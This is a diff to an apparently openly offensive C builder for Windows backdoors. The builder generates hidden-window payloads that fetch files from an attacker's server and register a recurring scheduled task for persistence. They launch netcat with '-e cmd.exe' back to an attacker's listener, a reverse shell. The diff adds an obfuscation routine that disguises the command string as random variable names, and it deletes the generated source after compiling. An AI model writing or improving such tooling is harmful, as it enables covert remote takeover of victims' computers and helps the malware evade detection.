@@ -1,6 +1,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
+#include <unistd.h>
 
 #define SOURCE_CODE "#include <iostream>\n#include <windows.h>\n#include <string>\nint main(int argc, char *argv[])\n{\nShowWindow(GetConsoleWindow(), SW_HIDE);\nsystem("
 
@@ -27,15 +28,84 @@ void compile(char *compiled_file, char *first_file_provided)
     strcat(cmd, ".exe");
 
     system(cmd);
+    sleep(2);
+    remove(compiled_file);
+}
+
+char *generateRandomString(char *string, const int length)
+{
+    static const char alphanum[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+
+    for (int i = 0; i < length; ++i)
+    {
+        string[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+    }
+
+    string[length] = 0;
+    return string;
+}
+
+void obfuscate(char *tmp_file_name, char *cmd_non_obfuscate)
+{
+    FILE *c_TMP;
+    int i = 0;
+    int j = 0;
+    int k = 0;
+    char cmd[100][10000];
+    char source_code[10000];
+    char random_variable[2000];
+    char alphabet[100] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 .-><:'()/&";
+
+    source_code[0] = '\0';
+    strcat(source_code, "#include <iostream>\n#include <windows.h>\n#include <string>\nint main(int argc, char *argv[])\n{\nShowWindow(GetConsoleWindow(), SW_HIDE);\n");
+
+    c_TMP = fopen(tmp_file_name, "w+");
+    fputs(source_code, c_TMP);
+    source_code[0] = '\0';
+
+    while (i != strlen(alphabet))
+    {
+        char letter[2] = {alphabet[i], '\0'};
+        strcat(source_code, "std::string ");
+        strcat(source_code, generateRandomString(random_variable, 20));
+        strcat(source_code, " = \"");
+        strcat(source_code, letter);
+        strcat(source_code, "\";");
+        strcat(source_code, "\n");
+
+        strcpy(cmd[i], random_variable);
+        i++;
+    }
+
+    fputs(source_code, c_TMP);
+    source_code[0] = '\0';
+
+    strcat(source_code, "system((");
+    while (k != strlen(cmd_non_obfuscate))
+    {
+        char letter[2] = {cmd_non_obfuscate[k], '\0'};
+        for (j = 0; j < strlen(alphabet); j++)
+        {
+            char alpha_letter[2] = {alphabet[j], '\0'};
+            if (letter[0] == alpha_letter[0])
+            {
+                strcat(source_code, cmd[j]);
+                strcat(source_code, "+");
+            }
+        }
+        k++;
+    }
+
+    source_code[strlen(source_code) - 1] = '\0';
+    strcat(source_code, ").c_str());\nreturn 0;\n}");
+    fputs(source_code, c_TMP);
+    fclose(c_TMP);
 }
 
 void generatePayload(char *victim_dir, char *file_provider, char *first_file_provided, char *second_file_provided, char *task_name, char *task_trigger)
 {
     char cmd_PAYLOAD[1000];
-    char source_code_PAYLOAD[2000];
-    FILE *c_TMP_PAYLOAD;
 
-    cmd_PAYLOAD[0] = '\"';
     cmd_PAYLOAD[1] = '\0';
     strcat(cmd_PAYLOAD, "c: & cd / & mkdir ");
     strcat(cmd_PAYLOAD, victim_dir);
@@ -65,25 +135,15 @@ void generatePayload(char *victim_dir, char *file_provider, char *first_file_pro
     strcat(cmd_PAYLOAD, first_file_provided);
     strcat(cmd_PAYLOAD, ".exe & exit\"");
 
-    strcpy(source_code_PAYLOAD, SOURCE_CODE);
-    strcat(source_code_PAYLOAD, cmd_PAYLOAD);
-    strcat(source_code_PAYLOAD, ");\n}");
-
-    c_TMP_PAYLOAD = fopen("c_TMP_PAYLOAD.cpp", "w+");
-    fputs(source_code_PAYLOAD, c_TMP_PAYLOAD);
-
+    obfuscate("c_TMP_PAYLOAD.cpp", cmd_PAYLOAD);
     compile("c_TMP_PAYLOAD.cpp", "PAYLOAD");
-    free(c_TMP_PAYLOAD);
 }
 
 void generateExtension(char *victim_dir, char *host, char *port, char *second_file_provided, char *first_file_provided)
 {
     char cmd_EXTENSION[2000];
-    char source_code_EXTENSION[2000];
-    FILE *c_TMP_EXTENSION;
 
-    cmd_EXTENSION[0] = '\"';
-    cmd_EXTENSION[1] = '\0';
+    cmd_EXTENSION[0] = '\0';
     strcat(cmd_EXTENSION, "START /MIN ");
     strcat(cmd_EXTENSION, victim_dir);
     strcat(cmd_EXTENSION, "/");
@@ -92,17 +152,9 @@ void generateExtension(char *victim_dir, char *host, char *port, char *second_fi
     strcat(cmd_EXTENSION, host);
     strcat(cmd_EXTENSION, " ");
     strcat(cmd_EXTENSION, port);
-    strcat(cmd_EXTENSION, " -e cmd.exe -d ^\"");
+    strcat(cmd_EXTENSION, " -e cmd.exe -d ^");
 
-    strcpy(source_code_EXTENSION, SOURCE_CODE);
-    strcat(source_code_EXTENSION, cmd_EXTENSION);
-    strcat(source_code_EXTENSION, ");\n}");
-
-    c_TMP_EXTENSION = fopen("c_TMP_EXTENSION.cpp", "w+");
-    fputs(source_code_EXTENSION, c_TMP_EXTENSION);
-
-    free(c_TMP_EXTENSION);
-
+    obfuscate("c_TMP_EXTENSION.cpp", cmd_EXTENSION);
     compile("c_TMP_EXTENSION.cpp", first_file_provided);
 }
 
@@ -123,11 +175,11 @@ int main(int argc, char const *argv[])
     char file_provider[255];
     char first_file_provided[255];
     char second_file_provided[255];
-    char host[25];
-    char port[10];
+    char host[255];
+    char port[255];
     char task_name[255];
-    char task_trigger[10];
-    char task_number[10];
+    char task_trigger[255];
+    char task_number[255];
 
     while (strcmp(choice, "y") != 0 || strcmp(choice, "Y") != 0 || strcmp(choice, "n") == 0 || strcmp(choice, "N") == 0)
     {
@@ -158,27 +210,26 @@ int main(int argc, char const *argv[])
                 get("Please enter the time of recursive call for the system task you want to create to the victim [default : 'minutes']: ", task_trigger, 255);
                 if (strlen(task_trigger) == 0)
                 {
-                    strcpy(task_trigger, "/MO 5");
+                    strcpy(task_trigger, "/sc minute /MO 5");
                     break;
                 }
                 else if (strcmp(task_trigger, "1") == 0)
                 {
-                    strcpy(task_trigger, "/MO MINUTE: ");
-                    printf("%s", task_name);
+                    strcpy(task_trigger, "/sc minute /MO ");
                     get("How many minutes ? : ", task_number, 10);
                     strcat(task_trigger, task_number);
                     break;
                 }
                 else if (strcmp(task_trigger, "2") == 0)
                 {
-                    strcpy(task_trigger, "/MO HOURLY: ");
+                    strcpy(task_trigger, "/sc hour /MO ");
                     get("How many hours ? : ", task_number, 10);
                     strcat(task_trigger, task_number);
                     break;
                 }
                 else if (strcmp(task_trigger, "3") == 0)
                 {
-                    strcpy(task_trigger, "/MO DAILY: ");
+                    strcpy(task_trigger, "/sc daily /MO  ");
                     get("How many days ? : ", task_number, 10);
                     strcat(task_trigger, task_number);
                     break;
@@ -195,7 +246,7 @@ int main(int argc, char const *argv[])
                 }
                 else if (strcmp(task_trigger, "6") == 0)
                 {
-                    strcpy(task_trigger, "/I ");
+                    strcpy(task_trigger, "/sc onidle /I ");
                     get("How many idle time ? : ", task_number, 10);
                     strcat(task_trigger, task_number);
                     break;
@@ -238,9 +289,8 @@ int main(int argc, char const *argv[])
             strcpy(victim_dir, "C:/System");
             strcpy(first_file_provided, "EXTENSION");
             strcpy(second_file_provided, "nc");
-            strcpy(port, "4444");
             strcpy(task_name, "TaskSystem");
-            strcpy(task_trigger, "/mo 5");
+            strcpy(task_trigger, "/sc minute /mo 5");
 
             get("Please enter your file provider adress [example : 10.0.0.1/RES or provider.com]: ", file_provider, 255);
             while (strlen(file_provider) == 0)
@@ -252,6 +302,12 @@ int main(int argc, char const *argv[])
             while (strlen(host) == 0)
             {
                 get("Please enter your listener IP [example : 10.0.0.1]: ", host, 25);
+            }
+
+            get("Please enter your listener PORT [default : 4444]: ", port, 10);
+            while (strlen(port) == 0)
+            {
+                strcpy(port, "4444");
             }
             break;
         }
